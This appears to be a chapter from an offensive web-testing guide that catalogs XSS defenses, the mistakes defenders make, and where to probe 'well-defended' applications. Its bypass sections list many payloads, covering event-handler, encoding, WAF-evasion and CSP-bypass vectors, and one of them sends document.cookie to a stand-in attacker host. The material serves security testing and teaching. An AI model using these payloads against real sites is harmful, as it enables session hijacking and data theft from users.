# 33 - XSS Prevention & Defense Intelligence

## Overview

Understanding defensive measures is critical for offensive testing. This document catalogs modern XSS prevention techniques, identifies common implementation mistakes, and maps where defenders typically leave gaps. Knowing how defenses work -- and where they fail -- directly informs attack strategies and bypass development.

---

## 1. Modern Prevention Techniques

### Output Encoding by Context

The core principle of XSS prevention is "encode on output, not on input." Data should remain in its original form throughout storage and processing, with encoding applied only during final output to browsers. OWASP defines six distinct encoding contexts, each requiring different encoding strategies.

**HTML Content Context:**
Encode `<`, `>`, `&`, `"`, and `'` as HTML entities.
```
< becomes &lt;
> becomes &gt;
& becomes &amp;
" becomes &quot;
' becomes &#x27; or &apos;
```

**HTML Attribute Context:**
All non-alphanumeric characters with ASCII values less than 256 should be encoded using the `&#xHH;` format. Critically, attributes must always be quoted -- unquoted attributes can be broken out of with far fewer characters.

```html
<!-- SAFE: Quoted attribute with encoding -->
<input value="&lt;user-input-here&gt;">

<!-- VULNERABLE: Unquoted attribute -->
<input value=user-input-here>
<!-- Attacker payload: x onclick=alert(1) -->
```

**JavaScript Context:**
Encode `"`, `'`, `\`, and all non-alphanumeric characters using `\xHH` or `\uHHHH` format. Never place user input inside script blocks without encoding.

```javascript
// VULNERABLE: Direct string interpolation
var name = "USER_INPUT_HERE";
// Attacker payload: ";alert(1);//

// SAFER: Using JSON encoding for data injection
var name = JSON.parse('ENCODED_USER_INPUT');
```

**CSS Context:**
Characters like `)` and `}` must be encoded to prevent closing a CSS rule prematurely. CSS allows `expression()` (IE) and `url()` which can execute JavaScript.

```css
/* VULNERABLE: User input in CSS value */
.element { background: url(USER_INPUT); }
/* Attacker payload: javascript:alert(1) (older browsers) */
```

**URL Context:**
Encode `?`, `=`, `&`, and `#` when injecting data into URLs. The `javascript:` and `data:` URI schemes must be explicitly blocked.

```
VULNERABLE: <a href="USER_INPUT">Click</a>
Attacker payload: javascript:alert(document.cookie)

SAFER: Validate URL scheme is http: or https: before rendering
```

**DOM Context:**
Use safe DOM APIs like `textContent` and `setAttribute()` instead of innerHTML or document.write(). Never use string-evaluated code execution functions (eval, setTimeout with strings, Function constructor) with user input.

Source: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
Source: https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS

### Content Security Policy (CSP)

CSP is a defense-in-depth mechanism that tells the browser which resources it should execute. If primary XSS defenses fail and executable input reaches a page, a properly configured CSP prevents execution.

**Recommended CSP Configuration:**
```
Content-Security-Policy:
  default-src 'none';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'nonce-{random}';
  img-src 'self' data:;
  font-src 'self';
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  require-trusted-types-for 'script';
```

**CSP Nonce-Based Approach (Recommended):**
- Generate a random nonce per request
- Include the nonce in the CSP header: `script-src 'nonce-abc123'`
- Add the nonce to all legitimate script tags: `<script nonce="abc123">`
- Attackers cannot predict the nonce, so injected scripts will not execute

**CSP Hash-Based Approach:**
- Calculate SHA-256/384/512 hash of each inline script
- Include hashes in the CSP header: `script-src 'sha256-base64hash'`
- Only scripts matching known hashes will execute
- Requires updating hashes whenever script content changes

Source: https://portswigger.net/web-security/cross-site-scripting/content-security-policy

### Trusted Types API

Trusted Types is a browser API that prevents DOM XSS by making DOM injection sinks secure by default. It requires data to pass through a transformation policy before being assigned to dangerous DOM properties.

**How it works:**
1. Enable via CSP: `Content-Security-Policy: require-trusted-types-for 'script'`
2. Define a policy that sanitizes input before it reaches DOM sinks
3. Browser throws a TypeError if raw strings are passed to injection sinks

**DOM Sinks Protected by Trusted Types:**
- HTML sinks: `Element.innerHTML`, `Element.outerHTML`, `document.write()`
- JavaScript sinks: script element text properties
- JavaScript URL sinks: script element src, anchor element href (with javascript:)

**Policy Definition Example:**
```javascript
// Create a Trusted Types policy
const policy = trustedTypes.createPolicy('sanitizePolicy', {
  createHTML: (input) => DOMPurify.sanitize(input),
  createScriptURL: (input) => {
    const url = new URL(input, document.baseURI);
    if (url.origin === location.origin) return url.href;
    throw new TypeError('Invalid script URL');
  }
});

// Usage - policy output is a TrustedHTML object
element.innerHTML = policy.createHTML(userInput);
```

**Browser Support:**
- Available in Chromium-based browsers since version 83 (2020)
- Not yet natively supported in Firefox or Safari
- Polyfill available for non-supporting browsers
- Google has adopted Trusted Types internally across many products

Source: https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API
Source: https://web.dev/trusted-types/
Source: https://research.google/pubs/adopting-trusted-types-in-production-web-frameworks-to-prevent-dom-based-cross-site-scripting-a-case-study/

### Browser Sanitization APIs

**Sanitizer API (Emerging Standard):**
The Sanitizer API is a browser-native HTML sanitizer currently in development, designed to safely parse and sanitize user-supplied HTML for DOM insertion.

```javascript
// Sanitizer API (when available)
const sanitizer = new Sanitizer();
element.setHTML(userInput, {sanitizer});
```

**setHTML() Method:**
The `Element.setHTML()` method provides a safe alternative to innerHTML by automatically sanitizing input.

### Framework Auto-Escaping

**React:**
- Automatically escapes values embedded in JSX by default
- All values are converted to strings before rendering
- XSS only possible through explicit unsafe APIs (dangerouslySetInnerHTML prop, javascript: in href)

**Angular:**
- Treats all values as untrusted by default
- Automatically sanitizes values in template bindings
- Developer must explicitly use `bypassSecurityTrust*` methods to render raw content

**Vue:**
- Template syntax ({{ }}) automatically escapes HTML
- `v-html` directive bypasses escaping (primary Vue XSS vector)
- Vue 3 improved default sanitization compared to Vue 2

---

## 2. HTTP Security Headers

### X-Content-Type-Options

```
X-Content-Type-Options: nosniff
```
Prevents browsers from MIME-sniffing a response away from the declared Content-Type. Without this header, browsers may interpret non-script responses as JavaScript, enabling XSS via content-type confusion.

### X-Frame-Options

```
X-Frame-Options: DENY
```
or
```
X-Frame-Options: SAMEORIGIN
```
Prevents the page from being embedded in iframes, mitigating clickjacking attacks that can be combined with XSS. Being superseded by CSP `frame-ancestors` directive.

### X-XSS-Protection (DEPRECATED)

```
X-XSS-Protection: 0
```
**This header should be set to 0 (disabled) or omitted entirely.** The X-XSS-Protection feature in browsers has been deprecated and removed:
- Chrome removed it in version 78 (2019)
- Edge removed it when switching to Chromium
- Firefox never implemented it
- Safari still supports it but it is considered unreliable

**Why it was deprecated:** The XSS auditor itself could be abused to selectively disable legitimate scripts on a page, creating new security issues. It was also easily bypassed and gave a false sense of security.

### Strict-Transport-Security (HSTS)

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```
Forces HTTPS connections, preventing man-in-the-middle attacks that could inject XSS payloads via HTTP. Relevant to XSS because network-level attackers can inject scripts into unencrypted HTTP responses.

### Referrer-Policy

```
Referrer-Policy: strict-origin-when-cross-origin
```
Controls how much referrer information is sent with requests, limiting data leakage from XSS-vulnerable pages.

### Permissions-Policy (formerly Feature-Policy)

```
Permissions-Policy: camera=(), microphone=(), geolocation=()
```
Limits what browser features JavaScript can access, reducing the impact of XSS by preventing access to sensitive APIs.

---

## 3. What Defenders Get Wrong

Understanding common defensive failures is the most valuable intelligence for offensive testing. These are the gaps where XSS vulnerabilities persist even in "protected" applications.

### Common Implementation Mistakes

**1. Incomplete Sanitization**

Defenders often sanitize the most obvious XSS vectors but miss edge cases:

```html
<!-- Defender blocks <script> tags but misses event handlers -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<details open ontoggle=alert(1)>

<!-- Defender blocks 'alert' but misses alternatives -->
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>

<!-- Defender blocks common tags but misses obscure ones -->
<marquee onstart=alert(1)>
<input onfocus=alert(1) autofocus>
<select autofocus onfocus=alert(1)>
<textarea onfocus=alert(1) autofocus>
<keygen autofocus onfocus=alert(1)>
```

**2. Context-Incorrect Encoding**

One of the most frequent mistakes: applying encoding for the wrong context.

```html
<!-- HTML encoding in JavaScript context - STILL VULNERABLE -->
<script>var x = '&lt;img src=x onerror=alert(1)&gt;';</script>
<!-- The HTML entities are NOT decoded inside script tags -->
<!-- But an attacker can still break out of the string context -->

<!-- JavaScript encoding in HTML context - STILL VULNERABLE -->
<div>\x3cimg src=x onerror=alert(1)\x3e</div>
<!-- JavaScript escape sequences are NOT interpreted in HTML -->

<!-- URL encoding in HTML context - STILL VULNERABLE -->
<a href="javascript%3Aalert(1)">Click</a>
<!-- Browsers decode URL encoding in href attributes -->
```

**3. Client-Side Only Validation**

Performing sanitization only in JavaScript on the client side is easily bypassed:
- Attackers can send requests directly using curl, Burp Suite, or browser dev tools
- Client-side sanitization libraries can be disabled or manipulated
- Server must always perform its own validation and encoding

**4. Blocklist-Based Filtering**

Blocklist approaches are fundamentally flawed because attackers can always find new ways to encode or obfuscate payloads:

```html
<!-- Case variation bypass -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>

<!-- Encoding bypass -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<a href="java&#115;cript:alert(1)">

<!-- Null byte injection (older systems) -->
<scr%00ipt>alert(1)</script>

<!-- Unicode normalization bypass -->
<img src=x onerror=\u0061lert(1)>

<!-- Double encoding bypass -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

Source: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

### CSP Deployment Failures

**1. Overly Permissive Policies**

```
# VULNERABLE: unsafe-inline allows all inline scripts
Content-Security-Policy: script-src 'self' 'unsafe-inline'

# VULNERABLE: unsafe-eval allows dynamic code execution functions
Content-Security-Policy: script-src 'self' 'unsafe-eval'

# VULNERABLE: Wildcard allows any subdomain including attacker-controlled
Content-Security-Policy: script-src *.example.com

# VULNERABLE: data: URI allows inline script injection
Content-Security-Policy: script-src 'self' data:
```

**2. JSONP Endpoint Exploitation**

If the CSP whitelists a domain that hosts a JSONP endpoint, attackers can use that endpoint to execute arbitrary JavaScript:

```html
<!-- CSP: script-src 'self' https://trusted-cdn.com -->
<!-- If trusted-cdn.com has a JSONP endpoint: -->
<script src="https://trusted-cdn.com/jsonp?callback=alert(1)//"></script>
```

**3. CDN/Library Whitelisting**

Whitelisting popular CDNs (cdnjs.cloudflare.com, cdn.jsdelivr.net, unpkg.com) in CSP allows attackers to load any library hosted on those CDNs, including libraries with known XSS gadgets:

```html
<!-- CSP allows cdnjs.cloudflare.com -->
<!-- Attacker loads Angular from CDN and uses template injection -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
```

**4. Report-Only Mode Left in Production**

`Content-Security-Policy-Report-Only` does not block execution -- it only reports violations. Developers sometimes deploy report-only mode for testing and forget to switch to enforcement.

**5. Base URI Not Restricted**

Without `base-uri 'self'` or `base-uri 'none'`, attackers can inject a `<base>` tag to change the base URL for relative script paths, loading scripts from an attacker-controlled domain.

Source: https://portswigger.net/web-security/cross-site-scripting/content-security-policy
Source: https://www.vaadata.com/blog/content-security-policy-bypass-techniques-and-security-best-practices/

### WAF Bypass Techniques (What Defenders Over-Rely On)

Web Application Firewalls are frequently treated as a primary XSS defense rather than defense-in-depth. WAFs have fundamental limitations that make them unreliable as a sole defense.

**1. Parameter Pollution**

```
# Send the same parameter twice; WAF inspects the first, app uses the second
GET /search?q=safe&q=<script>alert(1)</script>
```

**2. Encoding and Obfuscation**

```html
<!-- Double URL encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Unicode normalization -->
Attackers use full-width Unicode characters as substitutes for ASCII

<!-- HTML entity encoding in event handlers -->
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
```

**3. HTTP Method/Header Injection**

```
# WAF may only inspect GET/POST bodies, not custom headers
X-Forwarded-For: <script>alert(1)</script>
User-Agent: <script>alert(1)</script>
Referer: <script>alert(1)</script>
```

**4. Content-Type Manipulation**

```
# WAF may not inspect multipart/form-data or application/json payloads
Content-Type: multipart/form-data; boundary=--XSS
Content-Type: application/json
```

**5. Azure WAF Specific Bypass (2025):**
Azure WAF was found to be bypassable using payloads like `test';alert(1);//` that exploit parsing discrepancies in escaped character handling.

**6. Chunked Transfer Encoding:**
Splitting payloads across chunks can bypass WAFs that do not reassemble chunked requests.

Source: https://blog.ethiack.com/blog/bypassing-wafs-for-fun-and-js-injection-with-parameter-pollution
Source: https://medium.com/infosecmatrix/web-application-firewall-waf-bypass-techniques-that-work-in-2025-b11861b2767b
Source: https://arxiv.org/html/2503.10846v1

### Over-Reliance on Sanitization Libraries

**DOMPurify Misconfiguration:**
- Using `SAFE_FOR_TEMPLATES: true` with user input enables template literal bypasses (CVE-2025-26791)
- Not updating DOMPurify to latest version leaves known bypasses (mXSS, prototype pollution)
- Custom ALLOW_TAGS or ALLOW_ATTR configurations that re-enable dangerous elements
- Not using `RETURN_DOM_FRAGMENT` or `RETURN_DOM` when appropriate

**Framework Bypass Assumptions:**
- Assuming React/Angular/Vue auto-escaping covers all cases
- Not sanitizing data before storing in the database (relying only on output encoding)
- Ignoring server-side rendering contexts where framework protections may not apply
- Missing sanitization in WebSocket message handling, PDF generation, email templates

---

## 4. Defensive Gap Mapping for Offensive Testing

### Where to Find XSS in "Well-Defended" Applications

Based on the defensive failures documented above, prioritize testing these areas:

| Defense Layer | Common Gap | Test Approach |
|--------------|-----------|---------------|
| Output encoding | Context-incorrect encoding | Test JavaScript/URL/CSS contexts separately |
| CSP | unsafe-inline, CDN whitelisting | Check CSP header, look for JSONP endpoints on whitelisted domains |
| Framework escaping | Raw HTML rendering APIs | Search JS bundles for innerHTML, v-html, bypassSecurityTrust |
| WAF | Encoding/obfuscation bypasses | Double encoding, Unicode normalization, parameter pollution |
| Sanitization library | Outdated versions, misconfiguration | Check library version, test with known bypass payloads |
| Input validation | Client-side only | Send payloads directly via proxy (Burp Suite) |
| HTTP headers | Missing or misconfigured | Check all security headers, especially CSP and X-Content-Type-Options |
| Third-party scripts | No SRI, CDN compromise | Identify all external script sources, check for SRI attributes |

### Attack Surface Priority

1. **Highest priority**: User input rendered in JavaScript context (template engines, JSON responses rendered as HTML)
2. **High priority**: Rich text editors (TinyMCE, CKEditor), file upload with HTML preview, SVG upload
3. **Medium priority**: URL parameters reflected in HTML, error messages with user input
4. **Lower priority (but still valuable)**: HTTP header reflection, PDF/email generation with user input
5. **Supply chain**: Third-party scripts loaded without SRI, shared CDN dependencies

Source: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
Source: https://www.penligent.ai/hackinglabs/owasp-xss-prevention-cheat-sheet-output-encoding-the-complete-guide-for-developers-and-security-engineers/
Source: https://developer.chrome.com/docs/lighthouse/best-practices/trusted-types-xss
Source: https://www.cryptika.com/wafs-protection-bypassed-to-execute-xss-payloads-using-js-injection-with-parameter-pollution/
